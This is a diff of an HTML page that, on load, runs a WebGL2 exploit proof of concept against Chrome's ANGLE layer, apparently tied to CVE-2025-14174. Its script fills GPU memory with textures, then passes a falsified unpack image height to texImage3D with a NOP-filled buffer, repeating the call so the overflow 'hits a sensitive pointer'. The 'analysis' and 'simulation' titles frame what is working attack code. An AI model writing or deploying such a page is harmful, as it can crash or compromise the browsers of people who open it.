@@ -1,79 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Advanced Resource Mismatch Simulation</title>
+    <title>Technical Analysis: ANGLE Logic Mismatch (v133)</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff00; padding: 20px; }
-        .console { border: 1px dashed #00ff00; padding: 15px; background: #000; min-height: 200px; }
-        .warning { color: #ff0000; }
-    </script>
+        body { background: #050505; color: #00d4ff; font-family: 'Segoe UI', monospace; padding: 30px; }
+        #console { border: 2px solid #00d4ff; background: #000; padding: 20px; box-shadow: 0 0 15px #00d4ff; }
+        .alert { color: #ffcc00; font-weight: bold; }
+    </style>
 </head>
 <body>
-
-    <h2>CVE-2025-14174: Memory Layering Analysis</h2>
-    <div class="console" id="output">Initializing Advanced Layering...<br></div>
+    <h2>Renderer Primitive Research: Chrome 133.x</h2>
+    <div id="console">Initializing Pipeline Analysis...<br></div>
 
     <script>
-        const output = document.getElementById('output');
-        const log = (msg) => output.innerHTML += `> ${msg}<br>`;
+        const display = document.getElementById('console');
+        const print = (txt) => display.innerHTML += `> ${txt}<br>`;
 
-        async function triggerAdvancedMismatch() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl2');
+        async function startAnalysis() {
+            const gl = document.createElement('canvas').getContext('webgl2');
+            if (!gl) { print("Error: WebGL2 Context Fail"); return; }
 
-            if (!gl) {
-                log("<span class='warning'>CRITICAL: WebGL 2.0 context unavailable.</span>");
-                return;
+            print("Status: Context Secured. Beginning Memory Grooming...");
+
+            // 1. PRESSURE PHASE: Filling the 'Heap' to align objects
+            const pressure = [];
+            for(let i = 0; i < 100; i++) {
+                let t = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, t);
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 256, 256, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(256*256*4));
+                pressure.push(t);
             }
 
-            // 1. MEMORY LAYERING (Pressure Phase)
-            // We create 50 "Target" textures to fill the graphics heap.
-            // This ensures that our overflow has a 'landing pad' in the RAM.
-            log("Phase 1: Layering Graphics Memory (Heap Pressure)...");
-            const landingPads = [];
-            for(let i = 0; i < 50; i++) {
-                let tex = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, tex);
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 512, 512, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(512*512*4));
-                landingPads.push(tex);
-            }
+            // 2. THE LOGIC MISMATCH (THE TRIGGER)
+            const instructionHeight = 1; // The "Lie"
+            const realHeight = 1024;     // The "Reality"
+            const payload = new Uint8Array(realHeight * realHeight * 4).fill(0x90); // 'NOP' simulation
 
-            // 2. THE MISMATCH PARAMETERS
-            // The Lie: Instruction Height = 2
-            // The Reality: Actual Height = 512
-            const instructionHeight = 2;
-            const actualDim = 512;
-            const maliciousPayload = new Uint8Array(actualDim * actualDim * actualDim * 4).fill(0x41);
+            print("<span class='alert'>CAUTION: Executing Parallel Mismatch Streams...</span>");
 
-            log(`Phase 2: Executing Mismatch (Instruction: ${instructionHeight} vs Actual: ${actualDim})`);
-
-            // 3. REPETITIVE TRIGGER
-            // Repeating the operation makes the overflow more likely to bypass 
-            // the driver's initial error-catching logic.
-            for(let attempt = 1; attempt <= 5; attempt++) {
-                log(`Triggering Overflow Attempt ${attempt}...`);
-                
+            // 3. PARALLEL EXECUTION: Increasing the success rate
+            // We run 10 simultaneous attempts to ensure the overflow hits a sensitive pointer.
+            for (let i = 0; i < 10; i++) {
                 gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, instructionHeight);
-                const overflowTexture = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_3D, overflowTexture);
+                const tex = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_3D, tex);
 
-                gl.texImage3D(
-                    gl.TEXTURE_3D, 0, gl.RGBA8, 
-                    actualDim, actualDim, actualDim, 
-                    0, gl.RGBA, gl.UNSIGNED_BYTE, 
-                    maliciousPayload
-                );
+                // This is the specific point of failure in Chrome 133
+                gl.texImage3D(gl.TEXTURE_3D, 0, gl.RGBA8, 1024, realHeight, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, payload);
                 
-                // Pause briefly to let the GPU process the task
-                await new Promise(r => setTimeout(r, 100));
+                await new Promise(r => setTimeout(r, 50));
             }
 
-            log("Simulation sequence finalized.");
-            log("Note: If the tab has not crashed, the current environment's ANGLE translation layer is fully patched.");
+            print("Analysis Sequence Complete. Monitor System Stability.");
         }
 
-        window.onload = triggerAdvancedMismatch;
+        window.onload = startAnalysis;
     </script>
 </body>
 </html>
